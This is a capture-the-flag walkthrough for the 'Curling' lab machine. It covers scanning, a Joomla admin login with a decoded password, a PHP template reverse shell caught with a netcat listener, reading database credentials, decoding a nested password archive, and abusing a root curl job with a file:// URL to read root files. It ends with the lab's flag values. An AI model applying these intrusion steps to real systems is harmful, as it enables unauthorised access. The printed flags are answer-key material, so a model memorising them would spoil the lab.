# Curling - Easy

```shell
sudo vim /etc/hosts
#add curling.htb

nmap -T4 -p- -A -Pn -v curling.htb

feroxbuster -u http://curling.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,403,404,405,500 --silent

nc -nvlp 4444
#activate Joomla reverse shell
#by visiting link, we get shell

id
#www-data

python3 -c 'import pty;pty.spawn("/bin/bash")'

ls -la /var/www/html

cat /var/www/html/configuration.php
#contains mysql creds

ls -la /opt

ls -la /home

ls -la /home/floris

cat /home/floris/password_backup
#file data in hexdump form
#check magic numbers
#convert to bz2 file

xxd -r password_backup > testfile.bz2

bzip2 -dk testfile.bz2
#extracts testfile

file testfile
#gzip

mv testfile testfile.gz

gzip -dk testfile.gz

file testfile
#bzip2 file

bzip2 -dk testfile

file testfile.out
#posix tar archive

tar -xvf testfile.out
#gives password

cat password.txt
#contains password

ssh floris@curling.htb

#get user flag

ls -la

cd admin-area

ls -la

cat input

cat report
#files are modified every minute
#the url in input is fetched in report

vim input
#modify to fetch /administrator

cat report
#it is updated

vim input
#modify url value to "file:///root/root.txt"

#we get root flag
cat report
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29

* The webpage on port 80 leads to a blog page running on some CMS.

* With the help of ```cmseek```, we find that it is running ```Joomla v3.8.8```

* Checking the blog posts, we can enumerate a possible username "floris"; the first blog also contains the string "curling2018", which could be a possible common password.

* However, login as "admin:curling2018" or "floris:curling2018" does not work, so we can enumerate further for clues.

* Using ```feroxbuster```, we can enumerate the directories for clues.

* Now, this gives us multiple directories such as /components and /cache, but we cannot access them.

* However, one file /secret.txt stands out - this contains a string.

* This string can be decoded from base64 to give us the phrase "Curling2018!" - this could be a password.

* Using this password, we are able to login as 'floris' user in /administrator; giving us access to Joomla Control Panel.

* We can now simply modify the PHP template files and replace it with PHP reverse shell code.

* After saving the content, we can activate reverse shell on our listener by visiting the index.php link or clicking 'Template Preview'.

* We get reverse shell as ```www-data```.

* Now, in the web directory, 'configuration.php' contains creds for ```mysql```.

* Furthermore, in floris' home directory, we can find a file for 'password_backup'.

* This file contains some data in form of hexdump - we can copy it to our machine.

* Now, we can check ```magic numbers``` from this data, in order to figure the extension.

* Searching for the same using the magic number '42 5a 68', we can see that this is for ```.bz2``` files.

* So, we can convert this hexdump to original file using ```xxd``` - this gives us a .bz2 file

* If we extract from this .bz2 file, we get another file in the format of gzip.

* Extracting from the gzip file gives us another bzip2 file.

* When decompressed, the bzip2 file gives us a POSIX tar archive.

* Finally, extracting from the tar archive gives us a .txt file containing a password.

* This password can be used to login as 'floris' via ```SSH```.

* Now, we can check the 'admin-area' folder in home directory - this contains two files, input and report.

* These files are modified every minute, so it is possible they are being constantly updated.

* The input file contains the following content:

```url = "http://127.0.0.1"```

* And the report file contains the code for <http://curling.htb>

* Thus, the input file uses the 'url' value and with ```curl```, it fetches the URL page.

* We can test this by editing the input file to fetch the contents of /administrator page; the report file gets updated.

* So, we can read the root flag using ```curl``` by modifying url value to "file:///root/root.txt"

* We get root flag from the report file in a minute.

```markdown
1. User flag - 516950a94ed9ac926245a3faeec329e1

2. Root flag - e5d0cf3490ce1c37c2a1b0b71ecd502a
```
